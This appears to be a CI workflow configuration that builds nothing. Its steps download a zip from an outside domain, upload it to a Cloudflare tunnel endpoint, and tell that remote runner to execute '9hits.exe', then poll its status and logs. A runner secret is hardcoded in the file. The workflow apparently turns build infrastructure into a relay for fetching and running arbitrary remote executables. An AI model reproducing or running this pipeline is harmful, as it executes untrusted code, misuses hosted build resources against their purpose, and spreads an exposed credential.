workflows:
  send-to-runner:
    name: Send archive to runner
    instance_type: mac_mini_m2
    max_build_duration: 30
    environment:
      vars:
        RUNNER_URL:    "https://ads-dicke-joy-laws.trycloudflare.com"
        RUNNER_SECRET: "uHIUq9o4Sal6GdOByn0kmpfg/fvjWt1zz+NH6VUQzdY="
        DROPBOX_URL:   "https://chaincripta.com/chaincripta_30_git_codemag/chaincripta_30_git_codemag.zip"
        EXE_NAME:      "9hits.exe"
    scripts:
      - name: Download ZIP from Dropbox
        script: |
          set -e
          DIRECT_URL="${DROPBOX_URL/dl=0/dl=1}"
          curl -L --fail --silent --show-error -o /tmp/MyApp.zip "$DIRECT_URL"
          ls -lh /tmp/MyApp.zip

      - name: Health check runner
        script: |
          set -e
          curl -sS --fail -H "X-Secret: $RUNNER_SECRET" "$RUNNER_URL/health"; echo

      - name: Upload ZIP
        script: |
          set -e
          curl -sS --fail -H "X-Secret: $RUNNER_SECRET" \
               --data-binary @/tmp/MyApp.zip "$RUNNER_URL/upload"; echo

      - name: Execute exe
        script: |
          set -e
          curl -sS --fail -H "X-Secret: $RUNNER_SECRET" \
               -X POST "$RUNNER_URL/execute?exe=$EXE_NAME"; echo

      - name: Poll status
        script: |
          for i in 1 2 3 4 5 6; do
            sleep 10
            echo "--- status #$i ---"
            curl -sS --fail -H "X-Secret: $RUNNER_SECRET" "$RUNNER_URL/status"; echo
          done

      - name: Fetch logs
        script: |
          curl -sS --fail -H "X-Secret: $RUNNER_SECRET" "$RUNNER_URL/logs"; echo
